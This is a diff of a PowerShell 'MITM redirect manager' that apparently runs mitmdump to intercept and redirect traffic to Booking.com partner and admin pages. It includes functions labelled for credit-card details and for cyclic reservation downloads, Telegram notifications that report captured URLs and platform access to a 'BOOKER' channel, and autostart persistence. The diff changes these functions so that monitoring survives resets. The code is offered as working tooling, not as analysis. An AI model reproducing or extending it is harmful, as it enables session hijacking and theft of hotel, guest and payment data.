         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile
+        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
+    
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
     $totalCycles = ($hotelIdsArray.Count, $reportIdsArray.Count | Measure-Object -Minimum).Minimum
     Log-Write ("Function 27 enabled with {0} cycles" -f $totalCycles)
@@ -1067,10 +1177,10 @@ function Enable-BookingReservationsCycleRedirect {
     Write-Host "📨 NOTIFICATIONS:" -ForegroundColor Cyan
     Write-Host "   - Each cycle completion sends Telegram notification with FULL URL"
     Write-Host "   - Final notification when ALL cycles completed"
+    Write-Host "   - ✅ ВСЕ УВЕДОМЛЕНИЯ ИДУТ В КАНАЛ BOOKER!"
     Write-Host ""
     
     Start-Mitmdump
-    
     Log-Write "Booking reservations CYCLE redirect enabled (function 27)."
 }
 
@@ -1095,6 +1205,8 @@ function Clear-Function27 {
 # ========== НОВЫЕ ФУНКЦИИ 21-26 ==========
 
 function Enable-PartnersRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     Log-Write "Starting FUNCTION 21..."
     
     Write-Host ""
@@ -1119,14 +1231,17 @@ function Enable-PartnersRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
+    
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
     Log-Write "Function 21 (Partners redirect) enabled"
     Save-AutostartState -FunctionName "FUNCTION_21"
@@ -1141,6 +1256,8 @@ function Enable-PartnersRedirect {
 }
 
 function Enable-PartnersAndMessRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     Log-Write "Starting FUNCTION 22..."
     
     Write-Host ""
@@ -1168,14 +1285,17 @@ function Enable-PartnersAndMessRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
+    
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
     Log-Write "Function 22 (Partners and Messaging) enabled"
     Save-AutostartState -FunctionName "FUNCTION_22"
@@ -1190,6 +1310,8 @@ function Enable-PartnersAndMessRedirect {
 }
 
 function Enable-DeviceRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     Log-Write "Starting FUNCTION 23..."
     
     Write-Host ""
@@ -1214,14 +1336,17 @@ function Enable-DeviceRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
+    
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
     Log-Write "Function 23 (Device Security) enabled"
     Save-AutostartState -FunctionName "FUNCTION_23"
@@ -1236,9 +1361,10 @@ function Enable-DeviceRedirect {
 }
 
 function Enable-PulseRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     Log-Write "Starting FUNCTION 24..."
     
-    $PulseDisabledFlag = "C:\temp\mitm_pulse_disabled.txt"
     Remove-Item -Path $PulseDisabledFlag -Force -ErrorAction SilentlyContinue
     
     Write-Host ""
@@ -1296,14 +1422,17 @@ function Enable-PulseRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
+    
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
     Log-Write ("Function 24 (Pulse) enabled with target: {0}" -f $toDomain)
     Save-AutostartState -FunctionName "FUNCTION_24"
@@ -1320,9 +1449,10 @@ function Enable-PulseRedirect {
 }
 
 function Enable-UltraPulseRedirect {
+    $function26WasEnabled = Preserve-Function26Flag
+    
     Log-Write "Starting FUNCTION 25..."
     
-    $PulseDisabledFlag = "C:\temp\mitm_pulse_disabled.txt"
     Remove-Item -Path $PulseDisabledFlag -Force -ErrorAction SilentlyContinue
     
     Write-Host ""
@@ -1384,14 +1514,16 @@ function Enable-UltraPulseRedirect {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $PulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
     ) | ForEach-Object {
         Remove-Item -Path $_ -ErrorAction SilentlyContinue
     }
+    
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
     
     Log-Write ("Function 25 (Ultra Pulse) enabled with Pulse target: {0}" -f $toDomain)
     Save-AutostartState -FunctionName "FUNCTION_25"
@@ -1408,42 +1540,12 @@ function Enable-UltraPulseRedirect {
     Start-Mitmdump
 }
 
-function Enable-MonitorPlatforms {
-    Log-Write "Starting FUNCTION 26..."
-    
-    Write-Host ""
-    Write-Host "=== FUNCTION 26: PLATFORM MONITORING ==="
-    Write-Host ""
-    Write-Host "[INFO] Monitors selected platforms including admin.booking.com"
-    Write-Host "       Telegram logs to appropriate channels"
-    Write-Host "       NO redirects - only monitoring"
-    Write-Host "       ✅ РАБОТАЕТ ПАРАЛЛЕЛЬНО С ДРУГИМИ ФУНКЦИЯМИ"
-    Write-Host ""
-    
-    if (-not (Test-Path (Split-Path $MonitorPlatformsFlag))) {
-        New-Item -ItemType Directory -Path (Split-Path $MonitorPlatformsFlag) -Force | Out-Null
-    }
-    New-Item -ItemType File -Path $MonitorPlatformsFlag -Force | Out-Null
-    
-    # НЕ удаляем другие флаги! Функция 26 работает параллельно
-    # Только удаляем конфликтующие базовые редиректы
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    
-    Log-Write "Function 26 (Platform Monitoring) enabled"
-    Save-AutostartState -FunctionName "FUNCTION_26"
-    
-    Write-Host ""
-    Write-Host "✅ Function 26 ACTIVATED" -ForegroundColor Green
-    Write-Host "   Monitoring platforms and admin.booking.com"
-    Write-Host "   ✅ Работает ПАРАЛЛЕЛЬНО с функциями 17, 18, 19, 21-25, 27"
-    Write-Host "   Telegram notifications based on domain"
-    Write-Host ""
-    
-    Start-Mitmdump
-}
+# ========== ФУНКЦИИ УПРАВЛЕНИЯ ==========
 
 function Disable-AllRedirects {
+    # ========== СОХРАНЯЕМ ФЛАГ ФУНКЦИИ 26 ==========
+    $function26WasEnabled = Preserve-Function26Flag
+    
     @(
         $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
         $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
@@ -1452,19 +1554,22 @@ function Disable-AllRedirects {
         $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
         $BookingCCDetailsHotelIdFile,
         $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
-        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
-        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile,
+        $PulseRedirectToFile, $DeviceRedirectDoneFlag, $PartnersRedirectDoneFlag,
+        $UltraPulseRedirectToFile,
         $BookingReservationsCycleFlag, $BookingReservationsCycleHotelIdsFile,
         $BookingReservationsCycleReportIdsFile, $BookingReservationsCycleIndexFile,
         $BookingReservationsCycleActiveFile, $BookingReservationsCycleNextRunFile
+        # $MonitorPlatformsFlag - НЕ УДАЛЯЕМ!
     ) | ForEach-Object {
         Remove-Item -Path $_ -Force -ErrorAction SilentlyContinue
     }
     
-    $PulseDisabledFlag = "C:\temp\mitm_pulse_disabled.txt"
+    # ========== ВОССТАНАВЛИВАЕМ ФЛАГ ФУНКЦИИ 26 ЕСЛИ ОН БЫЛ ==========
+    Restore-Function26Flag -wasEnabled $function26WasEnabled
+    
     Set-Content -Path $PulseDisabledFlag -Value "DISABLED" -Force
     
-    # Удаляем флаг автозапуска при полном отключении
+    # Удаляем флаг автозапуска
     Remove-Item -Path $AutostartFlag -Force -ErrorAction SilentlyContinue
     Remove-Item -Path $AutostartFunctionFile -Force -ErrorAction SilentlyContinue
     
@@ -1473,14 +1578,23 @@ function Disable-AllRedirects {
     Log-Write "All redirects disabled and proxy cleared."
     
     Write-Host ""
-    Write-Host "⚠️  IMPORTANT for Function 24 (Pulse):" -ForegroundColor Yellow
-    Write-Host "   Function 24 is now DISABLED" -ForegroundColor Cyan
+    Write-Host "⚠️  IMPORTANT:" -ForegroundColor Yellow
+    if ($function26WasEnabled) {
+        Write-Host "   ✅ FUNCTION 26 (MONITORING) IS STILL ACTIVE!" -ForegroundColor Green
+        Write-Host "   🔍 Platform monitoring continues to work in parallel" -ForegroundColor Cyan
+        Write-Host "   📨 Telegram notifications for platform access are still being sent" -ForegroundColor Cyan
+    } else {
+        Write-Host "   ❌ FUNCTION 26 (MONITORING) IS DISABLED" -ForegroundColor Red
+        Write-Host "   Use option 26 to enable monitoring" -ForegroundColor Yellow
+    }
+    Write-Host ""
+    Write-Host "   Function 24 (Pulse):" -ForegroundColor Yellow
     Write-Host "   ALL account.booking.com requests will redirect to admin.booking.com/hotel/hoteladmin/" -ForegroundColor Cyan
-    Write-Host "   This will work EVEN AFTER mitmdump restart" -ForegroundColor Green
     Write-Host ""
 }
 
-# ---------------- MAIN ----------------
+# ========== MAIN ==========
+
 Ensure-WorkDir
 Log-Write "Manager starting."
 
@@ -1502,7 +1616,6 @@ if (Test-Path $AutostartFlag) {
     }
     Log-Write "=" * 60
     
-    # Даем пользователю возможность отменить автозапуск
     Write-Host ""
     Write-Host "🔄 AUTOSTART DETECTED" -ForegroundColor Cyan
     Write-Host "   Previous session detected. Do you want to:" -ForegroundColor Cyan
@@ -1518,7 +1631,6 @@ if (Test-Path $AutostartFlag) {
     }
 }
 
-# Если не было автозапуска или пользователь выбрал начать заново - запрашиваем URL
 if (-not $AutostartDetected) {
     do {
         $redirectURL = Read-Host "Enter redirect target URL (include https://) or press Enter for empty"
@@ -1568,13 +1680,12 @@ $closeOption = switch ($closeChoice) {
 
 Close-Browsers-Gracefully -closeOption $closeOption
 
-# Если был автозапуск и пользователь выбрал продолжить - автоматически запускаем mitmdump
 if ($AutostartDetected) {
     Log-Write "🔄 Autostart: Starting mitmdump with saved configuration"
     Start-Mitmdump
 }
 
-# Function menu
+# ========== MAIN MENU ==========
 while ($true) {
     Write-Host ""
     Write-Host "=========== MITM REDIRECT MANAGER ==========="
@@ -1582,7 +1693,7 @@ while ($true) {
     Write-Host "   1) RESET (stop all)"
     Write-Host "   2) One-shot redirect"
     Write-Host "   3) Force redirect"
-    Write-Host "   4) DISABLE all redirects"
+    Write-Host "   4) DISABLE all redirects (сохраняет функцию 26!)"
     Write-Host "   5) Tail log"
     Write-Host "   6) EXIT"
     Write-Host ""
@@ -1608,10 +1719,15 @@ while ($true) {
     Write-Host "   23) Device security (pms)"
     Write-Host "   24) Pulse redirect (pms)"
     Write-Host "   25) Ultra Pulse (pms)"
-    Write-Host "   26) Platform monitoring only (ПАРАЛЛЕЛЬНО)"
-    Write-Host "   27) CYCLE Reservations download (полное логирование)"
+    Write-Host "   26) ✅ Platform monitoring ONLY (ПАРАЛЛЕЛЬНО - НЕ УДАЛЯЕТСЯ!)"
+    Write-Host "   27) CYCLE Reservations download (BOOKER CHANNEL)"
     Write-Host "   28) Clear Function 27"
     Write-Host "==========================================="
+    
+    $monitorStatus = if (Test-Path $MonitorPlatformsFlag) { "✅ ACTIVE" } else { "❌ DISABLED" }
+    Write-Host "📊 Function 26 status: $monitorStatus (работает параллельно)" -ForegroundColor Cyan
+    Write-Host ""
+    
     $opt = Read-Host "Enter option"
 
     switch ($opt) {
